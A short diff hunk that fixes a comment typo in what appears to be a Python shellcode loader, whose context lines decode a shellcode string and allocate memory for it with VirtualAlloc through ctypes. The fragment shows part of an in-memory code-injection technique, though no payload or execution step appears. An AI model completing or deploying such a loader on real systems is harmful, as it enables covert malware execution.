@@ -21,7 +21,7 @@ sc = sc.decode("string_escape")
 # convert to bytearray
 sc = bytearray(sc)
 
-# use types windll.kernel32 for virtualalloc reserves region of pages in virtual addres sspace
+# use types windll.kernel32 for virtualalloc reserves region of pages in virtual address space
 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                           ctypes.c_int(len(sc)),
                                           ctypes.c_int(0x3000),
